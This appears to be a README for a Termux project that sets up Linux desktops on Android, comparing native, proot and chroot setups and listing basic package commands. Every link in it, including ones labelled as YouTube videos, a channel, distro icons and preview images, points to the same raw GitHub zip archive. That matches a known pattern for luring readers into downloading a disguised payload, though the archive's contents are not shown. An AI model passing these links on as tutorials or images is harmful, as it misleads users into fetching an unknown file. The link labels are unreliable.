# Android on Linux: Termux X11 Desktops

Collection of scripts to launch Desktops with audio in Termux X11. You have also all the information needed to install your prefered Linux Distro and connect to it in the following steps. 

### ⚠️ If you want to see the information as it was before the update (as shown in most of the videos) check this out: [https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip](https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip)

### You can see it all explained on my Youtube channel: [LinuxDroidMaster](https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip)



# 📚 Index
* 🏁 [First steps](#first-steps)
* ⚔️ [Termux native VS Proot-distro VS Chroot](#choose-linux)
* 🐧 [How to install proot distributions: Alpine, Ubuntu, Debian, Arch, Kali Nethunter, Parrot OS, PostMarket OS](#proot-distributions)
* 💀 [How to install Chroot distributions: Ubuntu, Debian, Box64Droid](#chroot-distributions)
* 💻 [How to install Termux Native Desktop](#termux-native)
* 🔥 [Hardware acceleration in Termux](https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip)

<br>
<br>  

---  
<br>


## Linux Environments Preview
All environments are configured with XFCE4 Desktop but you can change it

| Proot distro (Debian) | Native | Chroot (Debian) |
|---------------------------------------------|---------------------------------------------|---------------------------------------------|
| <img src="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip"/> | <img src="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip"/>| <img src="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip"/>|


---  
<br>
<br>

# 🏁 First steps <a name=first-steps></a>
We are going to use Termux and Termux X11 in order to have a full Linux Desktop in our Android devices. 

* [[Video] How to install Termux](https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip)
* [[Video] How to install and use Termux X11](https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip)

Basic packages you need to install on Termux: 

```
pkg update
pkg upgrade
pkg install x11-repo
pkg install termux-x11-nightly
pkg install tur-repo
pkg install pulseaudio
pkg install proot-distro
pkg install wget
pkg install git
```

---  
<br>

# ⚔️ Termux native VS Proot-distro VS Chroot <a name=choose-linux></a>

When setting up Linux on your Android device, you have several options to choose from. Understanding the differences between them can help you decide which environment best suits your needs:

### [1. Termux Native](#termux-native)

- Main video: [Termux native Desktop](https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip)

Termux native refers to running Linux commands directly within the Termux app without any additional virtualization or containerization. It provides a lightweight and straightforward way to access Linux utilities on your Android device.

### [2. Proot-Distro](#proot-distro)

- Main video: [Debian proot and basic Termux X11 installation](https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip)

Proot-Distro is a method that utilizes `proot` (PRoot is a user-space implementation of chroot, mount --bind, and binfmt_misc) to run a full Linux distribution inside a chroot environment. This approach allows you to install and use a wide range of Linux distributions without root access. However, it may have some limitations compared to native installations.

### [3. Chroot](#chroot)

- Main video: [Debian Chroot](https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip)

Chroot is a Unix command that changes the apparent root directory for the current running process and its children. In the context of running Linux on Android, chroot is often used to create a separate Linux environment alongside the Android system. While it provides a more isolated environment compared to Termux native, it may require more advanced setup and additional tools.

#### Summary

- **Termux Native:** Simple and lightweight, but with limited capabilities compared to full Linux distributions.
- **Proot-Distro:** Allows running full Linux distributions without root access, but may have some limitations.
- **Chroot:** Provides a more isolated environment but requires more complex setup and additional tools.

Consider your requirements and preferences when choosing the Linux environment for your Android device.

---  
<br>

## Comparison of Linux Environments on Android

| Feature             | Proot          | Native         | Chroot         |
|---------------------|----------------|----------------|----------------|
| Needs Root?         | ❌ (No)        | ❌ (No)        | ✅ (Yes)       |
| Many Linux Apps?    | ✅ (Yes)   | ❌ (Limited)       | ✅ (Yes)       |
| Performance         | Moderate 💼    | Good 🚀        | Good 🚀   |

- **Needs Root?**: Indicates whether root access is required for setting up the environment.
- **Many Linux Apps?**: Reflects the level of compatibility with various Linux applications.
- **Customization Level**: Describes the extent to which the environment can be customized or configured.

---  
<br>

## 🐧 How to install proot distributions: Ubuntu, Debian, Arch, Kali Nethunter, Parrot OS, PostMarket OS <a name=proot-distributions></a>

Click on the different icons to see how you can install the distribution of your choice. All of them have a video explaining the process 

| Alpine | Ubuntu | Debian | Arch | Kali NetHunter | Parrot OS | PostMarket | Void |
|--------|--------|------|----------------|----------------|----------------|----------------|----------------|
| <a href="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip"><img src="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip" alt="Alpine Logo" width="100"></a> | <a href="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip"><img src="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip" alt="Ubuntu Logo" width="100"></a> | <a href="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip"><img src="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip" alt="Debian Logo" width="100"></a> | <a href="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip"><img src="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip" alt="Arch Logo" width="100"></a> | <a href="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip"><img src="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip" alt="Kali Logo" width="100"></a> | <a href="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip"><img src="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip" alt="Kali Logo" width="100"></a> | <a href="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip"><img src="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip" alt="PostMarket Logo" width="100"></a> | <a href="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip"><img src="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip" alt="Void logo" width="100"></a> |

---  
<br>

## 💀 How to install Chroot distributions: Ubuntu, Debian, Box64Droid <a name=chroot-distributions></a>

Click on the different icons to see how you can install the distribution of your choice. All of them have a video explaining the process 

| Ubuntu | Debian | Box64Droid (Ubuntu) | Arch |
|--------|--------|--------|--------|
| <a href="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip"><img src="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip" alt="Ubuntu Logo" width="100"></a> | <a href="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip"><img src="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip" alt="Debian Logo" width="100"></a> | <a href="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip"><img src="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip" alt="Debian Logo" width="100"></a> | <a href="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip"><img src="https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip" alt="Arch Logo" width="100"></a> |

---  
<br>

## 💻 How to install Termux Native Desktop <a name=termux-native></a>
### You have all the information to install a native Termux Desktop and all the available apps [here](https://raw.githubusercontent.com/Marzelthan29/Termux-Desktops/main/Documentation/proot/Desktops-Termux-v2.2.zip).
